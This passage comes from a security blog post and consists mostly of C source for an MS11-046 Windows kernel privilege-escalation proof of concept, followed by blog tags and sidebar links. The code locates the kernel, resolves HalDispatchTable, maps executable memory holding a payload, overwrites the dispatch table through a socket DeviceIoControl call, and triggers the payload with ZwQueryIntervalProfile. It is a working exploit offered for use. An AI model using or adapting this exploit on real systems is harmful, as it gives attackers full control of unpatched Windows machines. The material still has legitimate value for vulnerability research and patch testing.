<br/>    </span><span style="color: #0000BB">ULONG_PTR result</span><span style="color: #007700">;
<br/>
<br/>    </span><span style="color: #0000BB">hints</span><span style="color: #007700">.</span><span style="color: #0000BB">ai_family </span><span style="color: #007700">= </span><span style="color: #0000BB">AF_UNSPEC</span><span style="color: #007700">;
<br/>    </span><span style="color: #0000BB">hints</span><span style="color: #007700">.</span><span style="color: #0000BB">ai_socktype </span><span style="color: #007700">= </span><span style="color: #0000BB">SOCK_STREAM</span><span style="color: #007700">;
<br/>    </span><span style="color: #0000BB">hints</span><span style="color: #007700">.</span><span style="color: #0000BB">ai_protocol </span><span style="color: #007700">= </span><span style="color: #0000BB">IPPROTO_TCP</span><span style="color: #007700">;
<br/>
<br/>
<br/>    </span><span style="color: #0000BB">printf</span><span style="color: #007700">(</span><span style="color: #DD0000">"\n [+] MS11-046 Exploit by fb1h2s(Rahul Sasi) "</span><span style="color: #007700">);
<br/>   </span><span style="color: #FF8000">/*
<br/>MS11-046 Was a Zero day found in the wild , reported to MS by
<br/>
<br/>Steven Adair from the Shadowserver Foundation and Chris S .
<br/>
<br/>Ronnie Johndas wrote the writeup dissecting a malware with the exploit details .
<br/>
<br/>I Rahul Sasi(fb1h2s) just made the POC exploit available .
<br/>
<br/>Reference: ms8_66, ms6_49 http://www.whitecell.org/list.php?id=50 exp codes
<br/>
<br/>*/
<br/>    </span><span style="color: #0000BB">status </span><span style="color: #007700">= </span><span style="color: #0000BB">ZwQuerySystemInformation</span><span style="color: #007700">(</span><span style="color: #0000BB">SystemModuleInformation</span><span style="color: #007700">, &amp;</span><span style="color: #0000BB">n</span><span style="color: #007700">, </span><span style="color: #0000BB">0</span><span style="color: #007700">, &amp;</span><span style="color: #0000BB">n</span><span style="color: #007700">);
<br/>
<br/>    </span><span style="color: #0000BB">q </span><span style="color: #007700">= (</span><span style="color: #0000BB">ULONG </span><span style="color: #007700">*)</span><span style="color: #0000BB">malloc</span><span style="color: #007700">(</span><span style="color: #0000BB">n </span><span style="color: #007700">* </span><span style="color: #0000BB">sizeof</span><span style="color: #007700">(*</span><span style="color: #0000BB">q</span><span style="color: #007700">));
<br/>    if (</span><span style="color: #0000BB">q </span><span style="color: #007700">== </span><span style="color: #0000BB">NULL</span><span style="color: #007700">) {
<br/>        </span><span style="color: #0000BB">perror</span><span style="color: #007700">(</span><span style="color: #DD0000">"malloc"</span><span style="color: #007700">);
<br/>        return -</span><span style="color: #0000BB">1</span><span style="color: #007700">;
<br/>    }
<br/>
<br/>    </span><span style="color: #0000BB">status </span><span style="color: #007700">= </span><span style="color: #0000BB">ZwQuerySystemInformation</span><span style="color: #007700">(</span><span style="color: #0000BB">SystemModuleInformation</span><span style="color: #007700">, </span><span style="color: #0000BB">q</span><span style="color: #007700">, </span><span style="color: #0000BB">n </span><span style="color: #007700">* </span><span style="color: #0000BB">sizeof</span><span style="color: #007700">(*</span><span style="color: #0000BB">q</span><span style="color: #007700">), </span><span style="color: #0000BB">NULL</span><span style="color: #007700">);
<br/>
<br/>    </span><span style="color: #0000BB">p </span><span style="color: #007700">= (</span><span style="color: #0000BB">PSYSTEM_MODULE_INFORMATION</span><span style="color: #007700">)(</span><span style="color: #0000BB">q </span><span style="color: #007700">+ </span><span style="color: #0000BB">1</span><span style="color: #007700">);
<br/>    </span><span style="color: #0000BB">base </span><span style="color: #007700">= </span><span style="color: #0000BB">NULL</span><span style="color: #007700">;
<br/>
<br/>    </span><span style="color: #FF8000">// Loop Loop The table and check for our krl
<br/>
<br/>    </span><span style="color: #007700">for (</span><span style="color: #0000BB">i </span><span style="color: #007700">= </span><span style="color: #0000BB">0</span><span style="color: #007700">; </span><span style="color: #0000BB">i </span><span style="color: #007700">&lt; *</span><span style="color: #0000BB">q</span><span style="color: #007700">; </span><span style="color: #0000BB">i</span><span style="color: #007700">++)
<br/>    {
<br/>
<br/>     if( </span><span style="color: #0000BB">strstr</span><span style="color: #007700">(</span><span style="color: #0000BB">p</span><span style="color: #007700">[</span><span style="color: #0000BB">i</span><span style="color: #007700">].</span><span style="color: #0000BB">ImageName</span><span style="color: #007700">,</span><span style="color: #DD0000">"ntkrnlpa.exe"</span><span style="color: #007700">) )
<br/>
<br/>      {
<br/>             </span><span style="color: #0000BB">printf</span><span style="color: #007700">(</span><span style="color: #DD0000">"\n [+] Yo Yo found, and am In ntkrnlpa.exe \n"</span><span style="color: #007700">);
<br/>
<br/>              </span><span style="color: #0000BB">krl_addr </span><span style="color: #007700">= </span><span style="color: #0000BB">LoadLibraryExA</span><span style="color: #007700">(</span><span style="color: #DD0000">"ntkrnlpa.exe"</span><span style="color: #007700">,</span><span style="color: #0000BB">0</span><span style="color: #007700">,</span><span style="color: #0000BB">1</span><span style="color: #007700">);
<br/>              </span><span style="color: #0000BB">printf</span><span style="color: #007700">(</span><span style="color: #DD0000">"\t Base: 0x%x size: %u\t%s\n"</span><span style="color: #007700">,
<br/>            </span><span style="color: #0000BB">p</span><span style="color: #007700">[</span><span style="color: #0000BB">i</span><span style="color: #007700">].</span><span style="color: #0000BB">Base</span><span style="color: #007700">,
<br/>            </span><span style="color: #0000BB">p</span><span style="color: #007700">[</span><span style="color: #0000BB">i</span><span style="color: #007700">].</span><span style="color: #0000BB">Size</span><span style="color: #007700">,
<br/>            </span><span style="color: #0000BB">p</span><span style="color: #007700">[</span><span style="color: #0000BB">i</span><span style="color: #007700">].</span><span style="color: #0000BB">ImageName</span><span style="color: #007700">);
<br/>            </span><span style="color: #0000BB">krl_base </span><span style="color: #007700">= </span><span style="color: #0000BB">p</span><span style="color: #007700">[</span><span style="color: #0000BB">i</span><span style="color: #007700">].</span><span style="color: #0000BB">Base</span><span style="color: #007700">;
<br/>            break;
<br/>       }
<br/>
<br/>      else if(</span><span style="color: #0000BB">strstr</span><span style="color: #007700">(</span><span style="color: #0000BB">p</span><span style="color: #007700">[</span><span style="color: #0000BB">i</span><span style="color: #007700">].</span><span style="color: #0000BB">ImageName</span><span style="color: #007700">,</span><span style="color: #DD0000">"ntoskrnl.exe"</span><span style="color: #007700">))
<br/>
<br/>       {
<br/>
<br/>             </span><span style="color: #0000BB">printf</span><span style="color: #007700">(</span><span style="color: #DD0000">"\n [+] Yo Yo found, and am In ntoskrnl.exe\n"</span><span style="color: #007700">);
<br/>
<br/>             </span><span style="color: #0000BB">krl_addr </span><span style="color: #007700">= </span><span style="color: #0000BB">LoadLibraryExA</span><span style="color: #007700">(</span><span style="color: #DD0000">"ntoskrnl.exe"</span><span style="color: #007700">,</span><span style="color: #0000BB">0</span><span style="color: #007700">,</span><span style="color: #0000BB">1</span><span style="color: #007700">);
<br/>             </span><span style="color: #0000BB">printf</span><span style="color: #007700">(</span><span style="color: #DD0000">"\t Base Adress: 0x%x "</span><span style="color: #007700">,</span><span style="color: #0000BB">p</span><span style="color: #007700">[</span><span style="color: #0000BB">i</span><span style="color: #007700">].</span><span style="color: #0000BB">Base</span><span style="color: #007700">);
<br/>             </span><span style="color: #0000BB">krl_base </span><span style="color: #007700">= </span><span style="color: #0000BB">p</span><span style="color: #007700">[</span><span style="color: #0000BB">i</span><span style="color: #007700">].</span><span style="color: #0000BB">Base</span><span style="color: #007700">;
<br/>             break;
<br/>
<br/>       }
<br/>
<br/>       else
<br/>          {
<br/>              </span><span style="color: #0000BB">printf</span><span style="color: #007700">(</span><span style="color: #DD0000">"\n [+]Cdnt find, and am out\n"</span><span style="color: #007700">);
<br/>              exit(</span><span style="color: #0000BB">0</span><span style="color: #007700">);
<br/>          }
<br/>
<br/>
<br/>      }
<br/>    </span><span style="color: #0000BB">free</span><span style="color: #007700">(</span><span style="color: #0000BB">q</span><span style="color: #007700">);
<br/>
<br/>
<br/></span><span style="color: #0000BB">printf</span><span style="color: #007700">(</span><span style="color: #DD0000">"\n[+] Continue with Exploitation\n"</span><span style="color: #007700">);
<br/>
<br/></span><span style="color: #0000BB">HalDispatchTable </span><span style="color: #007700">= (</span><span style="color: #0000BB">ULONG_PTR</span><span style="color: #007700">)</span><span style="color: #0000BB">GetProcAddress</span><span style="color: #007700">(</span><span style="color: #0000BB">krl_addr</span><span style="color: #007700">,
<br/>            </span><span style="color: #DD0000">"HalDispatchTable"</span><span style="color: #007700">);
<br/>
<br/> if( !</span><span style="color: #0000BB">HalDispatchTable </span><span style="color: #007700">)
<br/> {
<br/>  </span><span style="color: #0000BB">printf</span><span style="color: #007700">(</span><span style="color: #DD0000">"[!!] Sh*t happen with HalDispatchTablen"</span><span style="color: #007700">);
<br/>  return </span><span style="color: #0000BB">FALSE</span><span style="color: #007700">;
<br/> }
<br/>
<br/> </span><span style="color: #0000BB">printf</span><span style="color: #007700">(</span><span style="color: #DD0000">"\tBase Nt=: 0x%x "</span><span style="color: #007700">,</span><span style="color: #0000BB">krl_base</span><span style="color: #007700">);
<br/> </span><span style="color: #0000BB">HalDispatchTable </span><span style="color: #007700">-= ( </span><span style="color: #0000BB">ULONG_PTR </span><span style="color: #007700">)</span><span style="color: #0000BB">krl_addr</span><span style="color: #007700">;
<br/> </span><span style="color: #0000BB">HalDispatchTable </span><span style="color: #007700">+= </span><span style="color: #0000BB">krl_base</span><span style="color: #007700">;
<br/>
<br/> </span><span style="color: #0000BB">printf</span><span style="color: #007700">(</span><span style="color: #DD0000">"\n[+] HalDispatchTable found \t\t\t [ 0x%p ]\n"</span><span style="color: #007700">,</span><span style="color: #0000BB">HalDispatchTable</span><span style="color: #007700">);
<br/>
<br/>
<br/> </span><span style="color: #0000BB">printf</span><span style="color: #007700">(</span><span style="color: #DD0000">"[+] ZwQueryIntervalProfile "</span><span style="color: #007700">);
<br/>
<br/></span><span style="color: #0000BB">ZwQueryIntervalProfile </span><span style="color: #007700">= ( </span><span style="color: #0000BB">PNTQUERYINTERVAL </span><span style="color: #007700">) </span><span style="color: #0000BB">GetProcAddress</span><span style="color: #007700">(</span><span style="color: #0000BB">GetModuleHandle</span><span style="color: #007700">(</span><span style="color: #DD0000">"ntdll.dll"</span><span style="color: #007700">),
<br/>                     </span><span style="color: #DD0000">"ZwQueryIntervalProfile"</span><span style="color: #007700">);
<br/> if( !</span><span style="color: #0000BB">ZwQueryIntervalProfile </span><span style="color: #007700">)
<br/> {
<br/>  </span><span style="color: #0000BB">printf</span><span style="color: #007700">(</span><span style="color: #DD0000">"[!!] Sh*t happen resolving ZwQueryIntervalProfile\n"</span><span style="color: #007700">);
<br/>  return </span><span style="color: #0000BB">FALSE</span><span style="color: #007700">;
<br/> }
<br/> </span><span style="color: #0000BB">printf</span><span style="color: #007700">( </span><span style="color: #DD0000">"\t\t\t [ 0x%p ]\n"</span><span style="color: #007700">,</span><span style="color: #0000BB">ZwQueryIntervalProfile </span><span style="color: #007700">);
<br/>
<br/>
<br/>
<br/></span><span style="color: #0000BB">printf</span><span style="color: #007700">(</span><span style="color: #DD0000">"[+] ZwAllocateVirtualMemory"</span><span style="color: #007700">);
<br/>
<br/>
<br/> </span><span style="color: #0000BB">ZwAllocateVirtualMemory </span><span style="color: #007700">= (</span><span style="color: #0000BB">PNTALLOCATE</span><span style="color: #007700">) </span><span style="color: #0000BB">GetProcAddress</span><span style="color: #007700">(</span><span style="color: #0000BB">GetModuleHandle</span><span style="color: #007700">( </span><span style="color: #DD0000">"ntdll.dll"</span><span style="color: #007700">),
<br/>                   </span><span style="color: #DD0000">"ZwAllocateVirtualMemory"</span><span style="color: #007700">);
<br/>
<br/> if( !</span><span style="color: #0000BB">ZwAllocateVirtualMemory </span><span style="color: #007700">)
<br/> {
<br/>  </span><span style="color: #0000BB">printf</span><span style="color: #007700">(</span><span style="color: #DD0000">"[!!] Unable to resolve ZwAllocateVirtualMemory\n"</span><span style="color: #007700">);
<br/>  return </span><span style="color: #0000BB">FALSE</span><span style="color: #007700">;
<br/> }
<br/>
<br/> </span><span style="color: #0000BB">printf</span><span style="color: #007700">( </span><span style="color: #DD0000">"\t\t\t [ 0x%p ]\n"</span><span style="color: #007700">,</span><span style="color: #0000BB">ZwAllocateVirtualMemory </span><span style="color: #007700">);
<br/> </span><span style="color: #0000BB">printf</span><span style="color: #007700">(</span><span style="color: #DD0000">"\n[+] Allocating memory at [ 0x%p ]...\n"</span><span style="color: #007700">,</span><span style="color: #0000BB">hexcode_addr</span><span style="color: #007700">);
<br/>
<br/> </span><span style="color: #0000BB">alloc_status </span><span style="color: #007700">= </span><span style="color: #0000BB">ZwAllocateVirtualMemory</span><span style="color: #007700">( </span><span style="color: #0000BB">INVALID_HANDLE_VALUE</span><span style="color: #007700">,
<br/>        &amp;</span><span style="color: #0000BB">hexcode_addr</span><span style="color: #007700">,
<br/>        </span><span style="color: #0000BB">0</span><span style="color: #007700">,
<br/>        &amp;</span><span style="color: #0000BB">sizeofshell</span><span style="color: #007700">,
<br/>        </span><span style="color: #0000BB">MEM_RESERVE</span><span style="color: #007700">|</span><span style="color: #0000BB">MEM_COMMIT</span><span style="color: #007700">|</span><span style="color: #0000BB">MEM_TOP_DOWN</span><span style="color: #007700">,
<br/>        </span><span style="color: #0000BB">PAGE_EXECUTE_READWRITE </span><span style="color: #007700">);
<br/> </span><span style="color: #0000BB">printf</span><span style="color: #007700">(</span><span style="color: #DD0000">"\n[+] status %p.\n"</span><span style="color: #007700">,</span><span style="color: #0000BB">alloc_status </span><span style="color: #007700">);
<br/>
<br/> if( </span><span style="color: #0000BB">alloc_status </span><span style="color: #007700">!= </span><span style="color: #0000BB">0 </span><span style="color: #007700">)
<br/> {
<br/>  </span><span style="color: #0000BB">printf</span><span style="color: #007700">(</span><span style="color: #DD0000">"[-] Sh*t happen with NtAllocateVirtualMemory() , %#X\n"</span><span style="color: #007700">,
<br/>                         </span><span style="color: #0000BB">alloc_status</span><span style="color: #007700">);
<br/>
<br/> }
<br/>
<br/> </span><span style="color: #0000BB">printf</span><span style="color: #007700">(</span><span style="color: #DD0000">"\t\tZwAllocateVirtualMemory() Allocated return Status, %#X\n"</span><span style="color: #007700">,
<br/>                         </span><span style="color: #0000BB">alloc_status</span><span style="color: #007700">);
<br/> </span><span style="color: #0000BB">memset</span><span style="color: #007700">(</span><span style="color: #0000BB">hexcode_addr</span><span style="color: #007700">, </span><span style="color: #0000BB">0x90</span><span style="color: #007700">, </span><span style="color: #0000BB">sizeofshell</span><span style="color: #007700">);
<br/>
<br/> </span><span style="color: #0000BB">memcpy</span><span style="color: #007700">( (</span><span style="color: #0000BB">void</span><span style="color: #007700">*)((</span><span style="color: #0000BB">BYTE</span><span style="color: #007700">*)</span><span style="color: #0000BB">hexcode_addr </span><span style="color: #007700">+ </span><span style="color: #0000BB">0x100</span><span style="color: #007700">),(</span><span style="color: #0000BB">void</span><span style="color: #007700">*)</span><span style="color: #0000BB">hexcode</span><span style="color: #007700">, </span><span style="color: #0000BB">sizeof</span><span style="color: #007700">(</span><span style="color: #0000BB">hexcode</span><span style="color: #007700">));
<br/>
<br/></span><span style="color: #0000BB">iResult </span><span style="color: #007700">= </span><span style="color: #0000BB">WSAStartup</span><span style="color: #007700">(</span><span style="color: #0000BB">MAKEWORD</span><span style="color: #007700">(</span><span style="color: #0000BB">2</span><span style="color: #007700">,</span><span style="color: #0000BB">2</span><span style="color: #007700">), &amp;</span><span style="color: #0000BB">wsaData</span><span style="color: #007700">);
<br/>if (</span><span style="color: #0000BB">iResult </span><span style="color: #007700">!= </span><span style="color: #0000BB">0</span><span style="color: #007700">) {
<br/>    </span><span style="color: #0000BB">printf</span><span style="color: #007700">(</span><span style="color: #DD0000">"WASUP Failed: %d\n"</span><span style="color: #007700">, </span><span style="color: #0000BB">iResult</span><span style="color: #007700">);
<br/>    return </span><span style="color: #0000BB">1</span><span style="color: #007700">;
<br/>}
<br/>
<br/></span><span style="color: #0000BB">iResult </span><span style="color: #007700">= </span><span style="color: #0000BB">getaddrinfo</span><span style="color: #007700">(</span><span style="color: #0000BB">DEFAULT_ADDR</span><span style="color: #007700">, </span><span style="color: #0000BB">DEFAULT_PORT</span><span style="color: #007700">, &amp;</span><span style="color: #0000BB">hints</span><span style="color: #007700">, &amp;</span><span style="color: #0000BB">result</span><span style="color: #007700">);
<br/>
<br/>
<br/></span><span style="color: #0000BB">ptr</span><span style="color: #007700">=</span><span style="color: #0000BB">result</span><span style="color: #007700">;
<br/>
<br/></span><span style="color: #FF8000">// SOCKET for connecting to localhost at 135
<br/>
<br/></span><span style="color: #0000BB">ConnectSocket </span><span style="color: #007700">= </span><span style="color: #0000BB">socket</span><span style="color: #007700">(</span><span style="color: #0000BB">ptr</span><span style="color: #007700">-&gt;</span><span style="color: #0000BB">ai_family</span><span style="color: #007700">, </span><span style="color: #0000BB">ptr</span><span style="color: #007700">-&gt;</span><span style="color: #0000BB">ai_socktype</span><span style="color: #007700">,
<br/>    </span><span style="color: #0000BB">ptr</span><span style="color: #007700">-&gt;</span><span style="color: #0000BB">ai_protocol</span><span style="color: #007700">);
<br/>if (</span><span style="color: #0000BB">ConnectSocket </span><span style="color: #007700">== </span><span style="color: #0000BB">INVALID_SOCKET</span><span style="color: #007700">) {
<br/>    </span><span style="color: #0000BB">printf</span><span style="color: #007700">(</span><span style="color: #DD0000">"[-] This is bad , Socket Error : %ld\n"</span><span style="color: #007700">, </span><span style="color: #0000BB">WSAGetLastError</span><span style="color: #007700">());
<br/>    </span><span style="color: #0000BB">freeaddrinfo</span><span style="color: #007700">(</span><span style="color: #0000BB">result</span><span style="color: #007700">);
<br/>    </span><span style="color: #0000BB">WSACleanup</span><span style="color: #007700">();
<br/>    return </span><span style="color: #0000BB">1</span><span style="color: #007700">;
<br/>}
<br/>
<br/></span><span style="color: #FF8000">// Connect to server.
<br/></span><span style="color: #0000BB">iResult </span><span style="color: #007700">= </span><span style="color: #0000BB">connect</span><span style="color: #007700">( </span><span style="color: #0000BB">ConnectSocket</span><span style="color: #007700">, </span><span style="color: #0000BB">ptr</span><span style="color: #007700">-&gt;</span><span style="color: #0000BB">ai_addr</span><span style="color: #007700">, (int)</span><span style="color: #0000BB">ptr</span><span style="color: #007700">-&gt;</span><span style="color: #0000BB">ai_addrlen</span><span style="color: #007700">);
<br/>if (</span><span style="color: #0000BB">iResult </span><span style="color: #007700">== </span><span style="color: #0000BB">SOCKET_ERROR</span><span style="color: #007700">) {
<br/>    </span><span style="color: #0000BB">closesocket</span><span style="color: #007700">(</span><span style="color: #0000BB">ConnectSocket</span><span style="color: #007700">);
<br/>    </span><span style="color: #0000BB">ConnectSocket </span><span style="color: #007700">= </span><span style="color: #0000BB">INVALID_SOCKET</span><span style="color: #007700">;
<br/>    </span><span style="color: #0000BB">printf</span><span style="color: #007700">(</span><span style="color: #DD0000">"[+]Unable to connect to server, modify code and add a server socket, and connect to it!\n"</span><span style="color: #007700">);
<br/>    </span><span style="color: #0000BB">WSACleanup</span><span style="color: #007700">();
<br/>    return ;
<br/>}
<br/>
<br/>else {
<br/>           </span><span style="color: #0000BB">printf</span><span style="color: #007700">(</span><span style="color: #DD0000">"[+]Hola Connected to server !\n"</span><span style="color: #007700">);
<br/>    }
<br/>
<br/>
<br/>
<br/></span><span style="color: #0000BB">memset</span><span style="color: #007700">(</span><span style="color: #0000BB">ibuf</span><span style="color: #007700">,</span><span style="color: #0000BB">0x90</span><span style="color: #007700">,</span><span style="color: #0000BB">sizeof</span><span style="color: #007700">(</span><span style="color: #0000BB">ibuf</span><span style="color: #007700">));
<br/></span><span style="color: #0000BB">memset</span><span style="color: #007700">(</span><span style="color: #0000BB">obuf</span><span style="color: #007700">,</span><span style="color: #0000BB">0x90</span><span style="color: #007700">,</span><span style="color: #0000BB">sizeof</span><span style="color: #007700">(</span><span style="color: #0000BB">obuf</span><span style="color: #007700">));
<br/>
<br/></span><span style="color: #0000BB">DeviceIoControl</span><span style="color: #007700">((</span><span style="color: #0000BB">HANDLE</span><span style="color: #007700">)</span><span style="color: #0000BB">ConnectSocket</span><span style="color: #007700">,
<br/>     </span><span style="color: #0000BB">0x12007</span><span style="color: #007700">,
<br/>     (</span><span style="color: #0000BB">LPVOID</span><span style="color: #007700">)</span><span style="color: #0000BB">ibuf</span><span style="color: #007700">,</span><span style="color: #0000BB">sizeof</span><span style="color: #007700">(</span><span style="color: #0000BB">ibuf</span><span style="color: #007700">),
<br/>     (</span><span style="color: #0000BB">LPVOID</span><span style="color: #007700">)</span><span style="color: #0000BB">obuf</span><span style="color: #007700">,</span><span style="color: #0000BB">0</span><span style="color: #007700">,
<br/>     &amp;</span><span style="color: #0000BB">Ret_size</span><span style="color: #007700">,
<br/>     </span><span style="color: #0000BB">NULL</span><span style="color: #007700">);
<br/>
<br/>
<br/> </span><span style="color: #0000BB">printf</span><span style="color: #007700">(</span><span style="color: #DD0000">"\n\n[+] Overwriting HalDispatchTable ...."</span><span style="color: #007700">);
<br/>
<br/> </span><span style="color: #0000BB">DeviceIoControl</span><span style="color: #007700">((</span><span style="color: #0000BB">HANDLE</span><span style="color: #007700">)</span><span style="color: #0000BB">ConnectSocket</span><span style="color: #007700">,
<br/>     </span><span style="color: #0000BB">0x12007</span><span style="color: #007700">,
<br/>     (</span><span style="color: #0000BB">LPVOID</span><span style="color: #007700">)</span><span style="color: #0000BB">ibuf</span><span style="color: #007700">,</span><span style="color: #0000BB">sizeof</span><span style="color: #007700">(</span><span style="color: #0000BB">ibuf</span><span style="color: #007700">),
<br/>     (</span><span style="color: #0000BB">LPVOID</span><span style="color: #007700">)</span><span style="color: #0000BB">HalDispatchTable</span><span style="color: #007700">,</span><span style="color: #0000BB">0</span><span style="color: #007700">,
<br/>     &amp;</span><span style="color: #0000BB">Ret_size</span><span style="color: #007700">,
<br/>     </span><span style="color: #0000BB">NULL</span><span style="color: #007700">);
<br/>
<br/>
<br/>
<br/> </span><span style="color: #0000BB">printf</span><span style="color: #007700">(</span><span style="color: #DD0000">"\n\n[+] This should work and break..."</span><span style="color: #007700">);
<br/>
<br/> </span><span style="color: #0000BB">ZwQueryIntervalProfile</span><span style="color: #007700">(</span><span style="color: #0000BB">stProfile</span><span style="color: #007700">,&amp;</span><span style="color: #0000BB">result</span><span style="color: #007700">);
<br/>
<br/>
<br/>
<br/>
<br/>} 
<br/></span><span style="color: #0000BB"></span>
</span>
</code></code></div>
</div>

					
				</blockquote>
			</div>
				


				<div class="blogcontrol fly">
					
				</div>

				<div class="blogmeta">
					

					
					<div class="tags" id="blogtagcontainer_316">
							Tags:
							<span id="blogtaglist_316">
								
								<a href="blog3f49.html?u=8&amp;tag=ms11-046">ms11-046</a>, 
	

	
		<a href="blog78ec.html?u=8&amp;tag=ms11-046+exploit">ms11-046 exploit</a>
								
							</span>
							
								<span id="blogtagmenu_316"><a href="threadtag518d.html?do=manage&amp;contenttype=vBBlog_BlogEntry&amp;contentid=316"><img alt="Add / Edit Tags" border="0" class="inlineimg" id="blogtag_316" src="images/misc/blog/tag_edit.png"/></a></span>
							
					</div>
					
				
					
					<dl class="blogcategory stats">
						<dt class="shade">Categories</dt>
						<dd>

	
		<a href="blog71e7.html?u=8&amp;blogcategoryid=-1">Uncategorized</a>
	
</dd>
					</dl>
					
				</div>
				<ul class="entrycontrols">
					
					
					
					
					
				</ul>

		</div>
	</div>

</div>

<div id="navlinks">
	<!-- top navlinks -->
	
		« <a href="blogba5a.html?b=316&amp;goto=prev">Prev</a>
		   
	
	<a href="bloge81f.html?u=8">Main</a>
		
			   
			<a href="blog5215.html?b=316&amp;goto=next">Next</a> »
		
	<!-- end top navlinks -->
</div>




<!-- lightbox scripts -->
	<script src="clientscript/vbulletin_lightbox6719.html?v=421" type="text/javascript"></script>
	<script type="text/javascript">
	<!--
	vBulletin.register_control("vB_Lightbox_Container", "entry316", 1);
	//-->
	</script>
<!-- / lightbox scripts -->




<h2 class="commentsheader" id="comments_heading"><a name="comments"></a>Comments</h2>

<div class="floatcontainer" id="above_comments">
	
	
		
</div>

<form action="../external.html?link=http://garage4hackers.com/blog_inlinemod.php?b=316" class="block" id="commentform" method="post">
	

	<div class="floatcontainer" id="below_comments">
		
	</div>

	<input name="s" type="hidden" value=""/>
	<input name="securitytoken" type="hidden" value="guest"/>
	<input name="b" type="hidden" value="316"/>
	<input name="bt" type="hidden" value=""/>
	<input name="url" type="hidden" value=""/>
	<input name="userid" type="hidden" value="8"/>
</form>








	
		<!-- Editor Scripts -->
<script type="text/javascript">
<!--

var CKEDITOR_BASEPATH = getBaseUrl() + 'clientscript/ckeditor/';

var ltr = 'left';



var ignorequotechars = 1;
var allowbasicbbcode = false;

// vB Phrases
vbphrase["must_enter_subject"]           = "You must enter a title / subject!";
vbphrase["message_too_short"]            = "The message you have entered is too short. Please lengthen your message to at least %1$s characters.";
vbphrase["click_quick_reply_icon"]       = "";
vbphrase["all_files"]                    = "All Files";
vbphrase["file_is_too_large"]            = "File is too Large";
vbphrase["invalid_file"]                 = "Invalid File";
vbphrase["maximum_number_of_attachments_reached"] = "Maximum number of attachments reached";

//-->
</script>
<!-- / Editor Scripts -->
		<script src="clientscript/ckeditor/ckeditor14ad.html?t=A7HG4HT&amp;v=421" type="text/javascript"></script><script src="clientscript/vbulletin_textedit6719.html?v=421" type="text/javascript"></script>
	
<div class="hidden" id="ajax_post_errors">
	<div class="block">
		<div class="blockhead floatcontainer">
			<span class="blockhead_info"><input class="button" id="quick_edit_errors_hide" type="button" value=" X "/></span>
			<h2>vBulletin Message</h2>
		</div>
		<div class="blockbody">
			<div class="blockrow" id="ajax_post_errors_message"> </div>
		</div>
		<div class="blockfoot">
			<a class="textcontrol" href="#" id="quick_edit_errors_cancel">Cancel Changes</a>
		</div>
	</div>
</div>
	<script src="clientscript/blog_quick_edit6719.html?v=421" type="text/javascript"></script>
	




	

	<h2 class="commentsheader" id="trackbacks_heading"><a name="trackbacks"></a>Trackbacks</h2>

	<div class="trackbacks_block">
		<span class="shade">Total Trackbacks</span> 0
	
		<div class="shade">
			<a class="shade" href="entryb4ba.html?b=316" title="Trackback URL">No other blogs currently reference this blog entry</a>
		</div>
	

		
		
		<div id="trackbackurl">
			Trackback URL: <input onmouseover="this.select();" type="text" value="http://garage4hackers.com/blog_callback.php?b=316"/>
		</div>
		
	</div>

	


<script type="text/javascript">
<!--
	vBulletin.register_control("vB_QuickEdit_Blog_Entry", "316");
    extra = {
    //
    };

    extra.userid = "8";

    vBulletin.register_control("vB_AJAX_TagEditor", "vBBlog_BlogEntry", "316", "blog", extra);
//-->
</script>
<script src="clientscript/vbulletin_menu6719.html?v=421" type="text/javascript"></script>
<script src="clientscript/vbulletin_ajax_tageditor6719.html?v=421" type="text/javascript"></script>
			<!-- End main content -->
		        </div>
		</div>
	</div>
	<div id="sidebar_container"><h6 class="actionbutton_container">
	
		<a class="pagetitleinfo textcontrol" href="register.html" rel="nofollow"><span>+</span> Create Blog</a>
	
	</h6>

<div id="blog_user_sidebar">
	

	<div class="block mainblock">
		<div class="blocksubhead"><a class="username offline" href="membere81f.html?u=8">fb1h2s</a></div>
		<div class="floatcontainer" id="userinfoblock">
			
			<a class="avatar" href="membere81f.html?u=8" title="fb1h2s's Avatar">
				<span class="avatarcontainer"><img alt="fb1h2s's Avatar" src="meb1c6.jpg?u=8&amp;dateline=1397117991&amp;type=profile"/></span>
			</a>
			
				
			<ul class="list_no_decoration" id="usermenu">
				
					<li>
						<a href="membere81f.html?u=8"><img alt="Go to Profile" src="images/site_icons/profile.png"/> Go to Profile</a>
					</li>
				
				
				

				
				
				<li>
					<a href="blog4af1.html?u=8&amp;do=markread&amp;readhash=" rel="nofollow"><img alt="Mark as Read" src="images/site_icons/markasread.png"/> Mark as Read</a>
				</li>
				
				
			</ul>
		</div>

		<div class="blockbody">
			<div class="blockrow">
				<div id="userstats">
					
					<dl class="stats">
						<dt>Join Date</dt>
						<dd>Jul 2010</dd>
					</dl>
					
					
					<dl class="stats">
						<dt>Location</dt>
						<dd>India</dd>
					</dl>
					
					
					<dl class="stats">
						<dt>Posts</dt>
						<dd>616</dd>
					</dl>
					<dl class="stats">
						<dt>Blog Entries</dt>
						<dd>32</dd>
					</dl>
					
					
					
					
					
				</div>

				
			</div>		
		</div>
	</div>
	<div class="underblock"></div>

	

	

	

	<ul id="moveable_blocks">
		
		
		
		
		
		
		
		
	<li id="block_entries">
		<div class="block smaller moveable" id="block_entries_div">
			<div class="blocksubhead" id="block_entries_handle">
				<a class="collapse" href="#top" id="collapse_c_blog_entries"><img alt="" id="collapseimg_blog_entries" src="images/buttons/collapse_40b.png"/></a>
				<a href="bloge81f.html?u=8">Recent Blog Posts</a>
			</div>
			<div class="blockbody" id="c_blog_entries">
				<ul class="blockrow">
					<li class="avatarcontent floatcontainer">
	<a class="smallavatar">
		
		<img alt="" src="20130721_1819593501.jpg?u=8&amp;dateline=1400680840&amp;type=thumb" title="" width="30"/>
		
	</a>
	<div class="smallavatartext">
		
		<a href="entry1698.html?b=3105">Maldrone the First Backdoor for drones.</a>
		
		<br/>
		
		01-26-2015 <span class="time">09:26 PM</span>
	</div>
</li><li class="avatarcontent floatcontainer">
	<a class="smallavatar">
		
		<img alt="" src="20130721_1819593501.jpg?u=8&amp;dateline=1400680840&amp;type=thumb" title="" width="30"/>
		
	</a>
	<div class="smallavatartext">
		
		<a href="entry5930.html?b=3103">Cracking a Captcha . Nullcon| EMC2 CTF 2015</a>
		
		<br/>
		
		01-15-2015 <span class="time">05:01 PM</span>
	</div>
</li><li class="avatarcontent floatcontainer">
	<a class="smallavatar">
		
		<img alt="" src="20130721_1819593501.jpg?u=8&amp;dateline=1400680840&amp;type=thumb" title="" width="30"/>
		
	</a>
	<div class="smallavatartext">
		
		<a href="entrye3ad.html?b=3098">Pentesting a DVB-C network .Hacking your cable TV Network Part 1</a>
		
		<br/>
		
		12-27-2014 <span class="time">07:23 PM</span>
	</div>
</li><li class="avatarcontent floatcontainer">
